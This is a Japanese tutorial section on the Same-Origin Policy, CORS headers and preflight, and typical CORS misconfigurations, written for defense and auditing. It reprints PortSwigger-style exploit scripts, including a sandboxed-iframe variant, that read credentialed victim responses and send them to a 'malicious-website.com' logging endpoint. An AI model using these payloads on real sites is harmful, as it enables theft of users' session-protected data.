## SOPとCORSの仕組み・典型的ミス

CSRF対策やクリックジャッキング対策と並んで、CORS（Cross-Origin Resource Sharing、オリジン間リソース共有）は「ブラウザのセキュリティ境界をどう緩めるか」を扱う仕組みである。CORSそのものは攻撃手法ではなく、SOP（Same-Origin Policy、同一オリジンポリシー）という強力な制約を、サーバー側が明示的に許可した範囲でだけ緩和するための**プロトコル**にすぎない。しかし、この「明示的に許可する」実装を誤ると、SOPが本来防いでいた「他人のセッションで自分のスクリプトを動かし、レスポンスを盗み見る」という攻撃が成立してしまう。本節では、SOPとCORSの正しい仕組みをまず固め、その上で実務でよく見る典型的な誤設定パターンを、原理レベルで解説する。

### SOPとは何を守っているのか

SOPは、あるオリジン（スキーム・ホスト・ポートの組）で読み込まれたスクリプトが、**別のオリジンのリソースを「読み取る」ことを禁止する**ブラウザの基本ルールである。ここで重要なのは、SOPが禁止しているのは主に「レスポンスの中身をJavaScriptから読み取ること」であり、「リクエストを送ること自体」ではないという点だ。`<img>`や`<form>`、あるいは`fetch`によるクロスオリジンPOSTは、SOP単体ではブロックされない。実際にサーバーへHTTPリクエストは届いてしまう（これがCSRFの前提でもある）。SOPが守っているのは、あくまで「攻撃者のスクリプトが、被害者の認証済みセッションで得られたレスポンス内容を読めるかどうか」である。

CORSは、この「読み取り」を安全にオリジン間で許可するための仕組みであり、サーバーが応答ヘッダで「このオリジンからの読み取りアクセスを許可する」と明示的に宣言しない限り、ブラウザはJavaScript側にレスポンスを渡さない。つまりCORSの設計思想は「デフォルト拒否、サーバーが個別に許可」というホワイトリスト方式であり、この許可判定のロジックにバグがあると、SOPというブラウザ側の防御機構がまるごと無効化される。

### CORSレスポンスヘッダの仕組み

> 出典: CORS — HTTP | MDN — https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

CORSはいくつかのHTTPヘッダの組み合わせで動作する。まず基本となるのが`Access-Control-Allow-Origin`（以下ACAO）である。

```http
Access-Control-Allow-Origin: https://foo.example
```

このヘッダは「このオリジンからのクロスオリジン読み取りを許可する」とブラウザに伝える。値には単一オリジンの明示指定、あるいはワイルドカード`*`（全オリジン許可）を指定できる。ただし後述する通り、認証情報（Cookieなど）を伴うリクエストでは`*`は使えない。

資格情報（クッキーやHTTP認証）を伴うリクエストを許可する場合は、`Access-Control-Allow-Credentials: true`を追加する必要がある。ここに、CORSの設計上もっとも重要な制約がある。**`Access-Control-Allow-Credentials: true`を返す場合、`Access-Control-Allow-Origin`はワイルドカード`*`を使えず、リクエストの`Origin`を反映した具体的な値でなければならない**、というブラウザ側の仕様である。これは「誰にでも中身を見せてよい」（`*`）と「あなたのクッキー付きでアクセスしてよい」（credentials: true）を同時に許可すると、事実上「全世界に対して、被害者のセッションで認証済みのレスポンスを渡す」ことになってしまうためだ。ブラウザはこの矛盾した組み合わせをFetch仕様レベルで禁止しており、`*`と`true`を同時に指定したレスポンスはブラウザ側で拒否される。

これらのヘッダ以外に、プリフライト応答で使われる次のヘッダがある。

- `Access-Control-Allow-Methods`: プリフライトで許可するHTTPメソッド一覧（例: `POST, GET, OPTIONS`）
- `Access-Control-Allow-Headers`: 実リクエストで送ってよいカスタムヘッダ一覧（例: `X-PINGOTHER, Content-Type`）
- `Access-Control-Expose-Headers`: JavaScriptから読み取れるレスポンスヘッダを明示的に増やす。これを指定しない限り、JS側から`fetch`のレスポンスで読めるヘッダは「CORSセーフリスト」に載った少数のヘッダ（`Content-Type`など）に限られる
- `Access-Control-Max-Age`: プリフライト結果のキャッシュ時間（秒）。例えば`86400`なら24時間、同じ組み合わせのプリフライトを省略できる

これらもすべて、資格情報付きリクエストに対しては`*`を使えない。

サーバーがオリジンごとに動的にACAOの値を変えている場合（ホワイトリストと照合して該当オリジンを反映するなど）、レスポンスには`Vary: Origin`を付けるべきである。これはCDNやプロキシのキャッシュに対して「このレスポンスは`Origin`リクエストヘッダの値によって内容が変わる」と伝えるものであり、付け忘れると、あるオリジン向けに許可されたレスポンスが別オリジンのユーザーにキャッシュ経由で誤って配信される恐れがある。

### プリフライト(preflight)の仕組みと、なぜ発生するのか

> 出典: CORS — HTTP | MDN — https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

クロスオリジンリクエストは、ブラウザによって「シンプルリクエスト」と「プリフライト付きリクエスト」に分類される。この分類はCORSの設計上、後方互換性のために存在する重要な仕組みである。`<form>`タグは古くからクロスオリジンPOSTを送信できていたため、GET/HEAD/POSTかつ限定的なヘッダしか使わないリクエストは、CORS登場以前から実質的に「送れて当然」のものだった。したがって、これらは新たに制限する必要がなく「シンプルリクエスト」としてプリフライトなしで送信される。

シンプルリクエストとみなされる条件は次の全てを満たす場合である。

- メソッドが `GET`・`HEAD`・`POST` のいずれか
- 手動で設定できるヘッダが `Accept`・`Accept-Language`・`Content-Language`・`Content-Type`（下記制限あり）・`Range`（単一範囲のみ）に限られる
- `Content-Type` が `application/x-www-form-urlencoded`・`multipart/form-data`・`text/plain` のいずれか
- `XMLHttpRequest.upload` にイベントリスナーが登録されていない
- リクエストで `ReadableStream` を使用していない

一方、`PUT`/`DELETE`/`PATCH`などの非シンプルメソッド、`Content-Type: application/json`のような対象外の値、`Authorization`ヘッダやカスタムヘッダの付加などは、いずれもプリフライトを発生させる。ブラウザは実リクエストを送る前に、まず`OPTIONS`メソッドで次のような確認リクエストを送る。

```http
OPTIONS /doc HTTP/1.1
Host: bar.other
Origin: https://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,x-pingother

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
```

サーバーがこのプリフライトに対して許可を返した場合のみ、ブラウザは実際のリクエスト（`POST /doc`本体）を送信する。ここで理解しておくべき原理は、**プリフライトはあくまでブラウザが「送信前」に安全確認をする仕組みであり、シンプルリクエストの場合はリクエスト自体は既にサーバーに到達している**ということだ。プリフライトの有無に関わらず、SOP/CORSが制御しているのは「レスポンスをJavaScriptに読ませるかどうか」である。この非対称性が、CSRFとCORS誤設定の違いを理解する鍵になる。CSRFは「サーバーに副作用のあるリクエストを届かせる」ことが目的であり、レスポンスの中身を読む必要がない攻撃なので、シンプルリクエストの範囲内で成立してしまう。一方、CORS誤設定の悪用は「レスポンス（センシティブなデータ）を読み取る」ことが目的であり、こちらはACAO/ACACヘッダの誤りが直接の原因になる。

### 資格情報付きリクエストの挙動

> 出典: CORS — HTTP | MDN — https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS

デフォルトでは、クロスオリジンの`fetch`や`XMLHttpRequest`はCookieなどの資格情報を送信しない。明示的にオプトインする必要がある。

```javascript
// Fetch APIの場合
fetch("https://bar.other/resources/credentialed-content/", {
  credentials: "include"
});

// XMLHttpRequestの場合
const xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", "https://bar.other/...");
xhr.send();
```

これに対しサーバー側は、次の両方を返さない限りブラウザはレスポンスをJavaScriptに渡さない。

```http
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Credentials: true
```

先述の通り、この`Access-Control-Allow-Credentials: true`と`Access-Control-Allow-Origin: *`の組み合わせは仕様上ブラウザに拒否される。ここが、多くの開発者が「じゃあ動的にOriginを反映すればいい」という発想に至る分岐点であり、次節で解説する典型的な誤設定の温床になる。

### 典型的な誤設定パターン1: Originの無条件リフレクション

> 出典: PortSwigger Web Security Academy — CORS learning path — https://portswigger.net/web-security/learning-paths/cors
> 出典: Detectify Blog — CORS misconfigurations explained — https://blog.detectify.com/best-practices/cors-misconfigurations-explained/

`*`は資格情報付きリクエストで使えないため、「複数のオリジンから資格情報付きでアクセスさせたい」という要件を持つ開発者は、しばしば次のような実装をしてしまう。

```
# 疑似コード: リクエストのOriginヘッダをそのまま許可オリジンとして返す
allow_origin = request.headers["Origin"]
response.headers["Access-Control-Allow-Origin"] = allow_origin
response.headers["Access-Control-Allow-Credentials"] = "true"
```

これは「動的に許可オリジンを決める」という仕組みそのものは正しいアプローチだが、**検証を一切行わずリクエスト元のOriginをそのまま返している**点が致命的である。これにより、攻撃者は自分の任意のオリジン（`https://attacker.example`など）から資格情報付きリクエストを送るだけで、ACAOにそのオリジンがそのまま反映され、ACACも`true`になる。結果として、SOPが本来防ぐはずだった「他サイトからのレスポンス読み取り」がそのまま許可されてしまう。

PortSwigger Web Security Academyのラーニングパスでは、この種の誤設定を次のカテゴリに整理している。

- **Origin reflection**（サーバーが生成するACAOヘッダが、クライアント指定のOriginヘッダをそのまま反映する）
- **Origin解析時のエラー**（Originヘッダのパース処理の不備）
- **nullオリジンのホワイトリスト化**
- **TLSのプロトコルダウングレードを招くCORS設定ミス**
- **クレデンシャルなしでのイントラネット公開**
- **CORSの信頼関係を利用したXSSの悪用**

この攻撃を実際に成立させるための典型的なペイロードは、被害者のブラウザ上で動作する次のようなスクリプトである。

```javascript
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get', 'https://vulnerable-website.com/sensitive-victim-data', true);
req.withCredentials = true;
req.send();
function reqListener() {
  location = '//malicious-website.com/log?key=' + this.responseText;
}
```

なぜこれが機能するのか、仕組みを追うと次の通りである。

1. 被害者が攻撃者の用意したページを開く。ページ内のこのスクリプトが`vulnerable-website.com`へリクエストを送る。
2. `withCredentials = true`が指定されているため、被害者のブラウザは同ドメインに紐づくCookie（セッションCookieなど）を自動的に付与してリクエストを送る。
3. 脆弱なサーバーはOriginヘッダ（攻撃者のオリジン）をそのまま`Access-Control-Allow-Origin`に反映し、`Access-Control-Allow-Credentials: true`も返す。
4. ブラウザはこの応答ヘッダの組み合わせを見て「このオリジンには資格情報付きレスポンスを渡してよい」と判断し、レスポンス本文をJavaScriptに渡す。
5. `reqListener`がレスポンス本文（機密データ）を読み取り、攻撃者のサーバーへクエリパラメータとして送信（外部送信=exfiltration）する。

この一連の流れが成立するのはひとえに、SOPが「読み取り制御」の判断をサーバーからの応答ヘッダに委ねているためであり、そのヘッダ生成ロジックに検証漏れがあると防御が丸ごと崩れる、という点が核心である。

### 典型的な誤設定パターン2: nullオリジンのホワイトリスト化

> 出典: OWASP WSTG — Testing Cross Origin Resource Sharing — https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
> 出典: PortSwigger Web Security Academy — CORS learning path — https://portswigger.net/web-security/learning-paths/cors

ブラウザは特定の状況下で`Origin: null`というヘッダを送信する。代表的なのは、`sandbox`属性を持つ`<iframe>`から発生するリクエストや、`data:`スキームのページ、あるいはローカルファイル(`file://`)から発生するリクエストである。開発中に「ローカルファイルから動作確認したい」といった理由で、この`null`をACAOのホワイトリストに加えてしまう実装が見られる。

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

この設定は、事実上ワイルドカードに近い危険性を持つ。なぜなら、攻撃者は自分のオリジンから直接アクセスする代わりに、`sandbox`属性を持つ`<iframe>`を使えば、任意のタイミングで`Origin: null`を持つリクエストを作り出せるからだ。

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();
function reqListener() {
  location='malicious-website.com/log?key='+this.responseText;
}
</script>"></iframe>
```

`sandbox`属性を指定した`<iframe>`は、デフォルトで発生元オリジンとは切り離された「不透明なオリジン(opaque origin)」を持つよう強制される。この不透明オリジンがブラウザによって`Origin: null`としてシリアライズされるため、開発者側で明示的にホワイトリストに加えていた`null`にちょうど一致してしまう。攻撃者はこの仕組みを悪用して、任意のWebページから`null`オリジンのリクエストを作り出せる。OWASP WSTGはこれを「`null`オリジンがワイルドカードのように機能してしまう」ケースとして明確に警告しており、テスト観点としては「サーバーが単純にOriginをリフレクトしていないか」「`*`をACAOに使っていないか」「`null`をホワイトリストに含めていないか」「資格情報を許可しているか」を確認するよう求めている。

### 典型的な誤設定パターン3: サブドメイン検証の不備(正規表現の未エスケープ・部分一致)

> 出典: Detectify Blog — CORS misconfigurations explained — https://blog.detectify.com/best-practices/cors-misconfigurations-explained/
> 出典: PortSwigger Web Security Academy — CORS learning path — https://portswigger.net/web-security/learning-paths/cors

「自社の全サブドメインからのアクセスを許可したい」という要件は自然に発生する。これを正規表現で実装しようとした際に、次のような典型的なミスが起こる。

```
# 意図: "example.com" の任意のサブドメインを許可したい
pattern = /^https:\/\/[a-z]+\.example\.com$/
```

このパターン自体は一見正しく見えるが、実際の実装ではしばしば`.`（ドット）がエスケープされずに書かれる。

```
# 誤り: ドットがエスケープされていない
pattern = /^https:\/\/[a-z]+.example.com$/
```

正規表現において、エスケープされていない`.`は「任意の1文字」にマッチする特殊文字であり、リテラルなピリオドを意味しない。つまりこのパターンは`asdf.example.com`だけでなく、ピリオドの位置に任意の1文字が入った`asdfXexample.com`のような文字列にもマッチしてしまう。攻撃者はこれを悪用し、実際に`asdfxexample.com`（ドットの代わりに任意の文字`x`を使った、攻撃者が取得可能なドメイン名）を登録するだけで検証を通過できる。Detectifyの記事はこれを「CORS誤設定の中でも定番」のバグとして挙げており、正しい実装では`\.`のようにドットを必ずエスケープする必要があると指摘している。

これ以外にも、文字列の部分一致だけで検証してしまう実装ミスが典型的である。PortSwigger Web Security Academyは次の2パターンを挙げている。

- **サフィックスマッチの弱さ**: `normal-website.com`で終わる全ドメインを許可すると、`hackersnormal-website.com`（`.`を挟まずに単純に文字列連結しただけのドメイン）も通過してしまう
- **プレフィックスマッチの弱さ**: `normal-website.com`で始まる全ドメインを許可すると、`normal-website.com.evil-user.net`（攻撃者が取得したドメインのサブドメインとして正規のドメイン名を冒頭に置く）も通過してしまう

いずれも共通する原理は同じで、「オリジンの一部分だけを見て判定する」実装は、URLの構文規則（`ホスト名.攻撃者ドメイン`という形でいくらでも正規のホスト名らしき文字列を先頭や末尾に埋め込める）を悪用され、意図しないオリジンを許可してしまう。正しい検証は、パース済みのホスト名全体を、許可リストと完全一致または正しく区切られたサブドメイン単位で比較する必要がある。

### 典型的な誤設定パターン4: プロトコルダウングレードと信頼できないサブドメインの混入

> 出典: PortSwigger Web Security Academy — CORS learning path — https://portswigger.net/web-security/learning-paths/cors
> 出典: Detectify Blog — CORS misconfigurations explained — https://blog.detectify.com/best-practices/cors-misconfigurations-explained/

HTTPS本体サイトが、HTTPで動いているサブドメイン(例: `http://legacy.example.com`)を許可オリジンに含めているケースがある。この場合、攻撃者は中間者攻撃(MITM)やネットワークレベルでの介入によって、平文のHTTP通信に介入し、被害者のブラウザにそのHTTPサブドメインへのリクエストを発生させることができれば、そこからのレスポンスとしてCORS越しにHTTPS側のセンシティブなデータへアクセスする足がかりを作れてしまう。TLSで保護しているはずのメインサイトが、保護されていないサブドメインを信頼することで、間接的に保護が破られる典型例である。

同様に、開発時にのみ使うつもりだった`localhost`や`127.0.0.1`をホワイトリストに残したまま本番公開してしまうケースもある。この場合、被害者のローカル環境で動くマルウェアやブラウザ拡張、あるいはローカルで動作する別のXSS脆弱性経由で、本番サイトへのクロスオリジン読み取りが可能になる。

また、JSBinやCodePenのような、誰でも任意のコードをホスティングできる第三者サービスをオリジンとして許可しているケースも報告されている。攻撃者はそれらのサービス上に自分のPoCコードをアップロードするだけで、正規のオリジンとして扱われるリクエスト元を用意できてしまう。Amazon S3のバケットに対して同様のワイルドカード的な許可を出しているケースでも、攻撃者が自分のS3バケットを新規作成し、そこを踏み台にすることが可能になる。

さらに見過ごされがちなのが、**信頼したサブドメイン自体にXSS脆弱性がある場合**である。仮にサブドメインの検証自体は正しく実装されていても(完全一致の許可リストであっても)、その信頼先のサブドメインにXSSがあれば、攻撃者はそのXSS経由でメインサイトへのCORSリクエストを、信頼された正規のオリジンから直接発行できてしまう。この場合、CORS設定自体に技術的な不備はないが、「信頼関係の推移」によって防御が破られる。CORSの許可リストを設計する際は、リストに含めるすべてのオリジンが「そのオリジン上で動く全コードを完全に信頼できるか」という基準で選定される必要がある。

### 検証観点のまとめ(テスト手順の要点)

> 出典: OWASP WSTG — Testing Cross Origin Resource Sharing — https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing

OWASP WSTGは、CORS設定を検査する際の着眼点を次のように整理している(防御・監査目的の観点であり、本稿では実在サービスへの無許可検証は前提としない)。

- レスポンスヘッダで`Access-Control-Allow-Origin`が`*`になっていないか(特に資格情報を扱うエンドポイントで)
- 任意のOrigin値を送った際に、サーバーがそれをそのままACAOへ反映していないか(無条件リフレクションの検出)
- `Origin: null`を送った際に、それがホワイトリストされていないか
- `Access-Control-Allow-Credentials: true`と組み合わせでこれらの不備が存在しないか(資格情報の有無で影響度が大きく変わる)
- ブラウザの開発者ツールやBurp SuiteのようなプロキシツールでHTTPヘッダをインターセプトし、実際のCORS設定の挙動を確認する

これらの観点は、本節で解説した「無条件リフレクション」「nullオリジンのホワイトリスト化」「正規表現・部分一致の検証不備」「信頼できないサブドメインの混入」という4つの典型パターンと直接対応している。次節以降では、これらの誤設定が実際のCSRF/CORS複合攻撃としてどのように悪用されるか、また安全な実装パターン(許可リストの完全一致比較、`Vary: Origin`の付与、資格情報が必要なエンドポイントの最小化など)について掘り下げていく。
